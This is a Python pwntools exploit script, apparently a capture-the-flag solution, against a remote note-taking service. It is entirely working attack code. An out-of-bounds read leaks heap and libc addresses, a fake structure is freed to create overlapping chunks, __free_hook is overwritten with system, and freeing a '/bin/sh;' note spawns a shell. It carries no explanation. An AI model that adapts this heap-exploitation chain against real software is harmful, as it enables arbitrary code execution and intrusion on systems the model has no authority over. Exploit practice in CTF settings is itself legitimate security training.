from pwn import *
from heaputils import *

def write(title, content):
	p.sendafter("==========MENU==========","w")
	p.sendafter("Title: ",title)
	p.sendafter("Press ESC after writing", content)

def read(index):
	p.sendafter("==========MENU==========","r")
	p.sendlineafter(":",str(index))

def delete(index):
	p.sendafter("==========MENU==========","d")
	p.sendlineafter(":",str(index))

def debug():
	PIE = get_PIE(p)
	head = u64(p.leak(PIE + 0x202010, 8))
	array = u64(p.leak(head + 0x10, 8))
	log.info("array at: 0x%x"%array)
	gdb.attach(p)

if __name__ == "__main__":
	libc = ELF("./libc-2.27.so")
	context.log_level = 'debug'
	p = remote("bincat.kr", 30428)
	write("abcd\n", "efgh\x1b") #0
	write("abcd\n", "efgh\x1b") #1 
	write("abcd\n", "efgh\x1b") #2
	write("abcd\n", "efgh\x1b") #3
	delete(2)
	delete(1)
	delete(0)

	idx = (0x55ae1d481050 - 0x55ae1d481260) // 8 - 2
	read(idx)
	p.recvuntil("===================================\n")
	data = p.recvline().strip("\n")
	HEAP = u64(data.ljust(8,"\x00"))
	log.info("HEAP: 0x%x"%HEAP)

	unsortedbinHeap = HEAP + 0x55a2895bd410 - 0x55a2895be420
	write("a"*8+p64(unsortedbinHeap)+"\n", "bbbb\x1b") # fake structure , index 0
	delete(0) # arbitrary free / read
	read(idx+2) # read fake structure
	p.recvuntil("-----------------------------------\n")
	data = p.recvline().strip("\n")
	LIBC = u64(data.ljust(8,"\x00")) + 0x7f631e6b6000 - 0x7f631eaa1ca0
	log.info("LIBC: 0x%x"%LIBC)

	# overlapping chunks to create a full fake structure
	targetPtr = HEAP + 0x559add43a340 - 0x559add43c420
	write("a"*8+p64(targetPtr)+"\n", "bbbb\x1b") #0
	delete(0)
	delete(idx+2)
	
	med = HEAP + 0x559b31167060 - 0x559b31169420
	write(p64(med)+"\n", "bbbb\x1b") #0
	write("a\n","b\x1b") #1
	write("c\n","d\x1b") #2
	pay = p64(LIBC + libc.symbols['__free_hook'])
	write(pay+"\n", "\x1b") # 4, get med allocated
	write("/bin/sh;\n","\x1b") # 5
	write(p64(LIBC + libc.symbols['system']) + "\n", "\x1b")
	delete(5)
	p.interactive()
